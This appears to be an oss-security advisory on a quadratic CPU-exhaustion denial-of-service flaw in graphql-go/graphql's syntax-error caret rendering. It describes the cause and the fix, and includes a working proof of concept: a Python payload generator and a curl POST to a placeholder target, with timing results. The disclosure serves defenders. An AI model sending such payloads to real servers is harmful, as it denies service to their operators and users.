X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/3
Message-ID: <CAK=gNzrqaNWsqHoLPXMB4Pvkzz+gHiTae7gHMzX=NzGfPEo6nw@mail.gmail.com>
Date: Sat, 29 Aug 2026 17:59:54 +0200
From: William Carrier <0x6675636b736f6369617479@...il.com>
To: oss-security@...ts.openwall.com
Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS from a single syntax error
Content-Type: text/plain; charset=utf-8

Hello,

This reports an algorithmic-complexity denial-of-service defect in
github.com/graphql-go/graphql, affecting all released versions up to and
including the latest, v0.8.1. No fixed version exists. It is
unauthenticated, network-reachable, triggered purely by attacker-controlled
query text, and requires no special configuration, a single syntax error,
no schema dependency. Reproduced against the published v0.8.1 module
fetched from the Go module proxy.

A CVE ID has been requested from MITRE and is pending.

== Affected ==

  Product:  github.com/graphql-go/graphql
  Versions: all <= v0.8.1; no fix available
  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)

== Details ==

When the parser reports a syntax error, gqlerrors.highlightSourceAtLocation
(gqlerrors/syntax.go) renders the "^" caret line by appending one space per
column in a loop:

    var highlight string
    ...
    for i := 1; i < (2 + padLen + l.Column); i++ {
        highlight += " "                     // Go string += reallocates +
copies all
    }
    highlight += "^\n"

Go string concatenation copies the entire accumulated string on every
iteration, so drawing the caret at column C is O(C^2). The column is
attacker-controlled: one unterminated string literal C bytes long yields
exactly one syntax error at column ~C. A single request is therefore
O(request_size^2) with just ONE syntax error and no schema involvement.

== Proof of concept ==

One POST whose query is an unterminated string literal of C characters:

    # query text:  { f(x: "AAAA...AAAA<newline>) }   with C 'A's before the
newline
    python3 - "$C" <<'PY' > body.json
    import sys, json
    c = int(sys.argv[1])
    q = '{ f(x: "' + 'a'*c + '\n) }'
    sys.stdout.write(json.dumps({"query": q}))
    PY
    curl -s -o /dev/null -w '%{time_total}\n' -X POST http://TARGET/graphql
\
         -H 'Content-Type: application/json' --data-binary @body.json

Measured over HTTP against v0.8.1 (clean quadratic, 2x column ~ 4x time):

    column=50000   (50 KB)   -> 2.1 s
    column=100000  (100 KB)  -> 9.2 s
    column=200000  (200 KB)  -> 54.0 s

== Impact ==

A single unauthenticated ~200 KB request with one syntax error consumes ~54
s of server CPU; a small number of concurrent such requests saturates the
worker pool and denies service. Lowest-effort trigger imaginable: one
malformed literal, any schema, no authentication, no configuration.

== Remediation ==

No fixed release exists. Build the caret padding in one allocation,
strings.Repeat(" ", n), a strings.Builder, or a bytes.Buffer -- instead of
the O(n^2) `highlight += " "` loop.

== Credit ==

  William Carrier, independent security researcher.

Best,

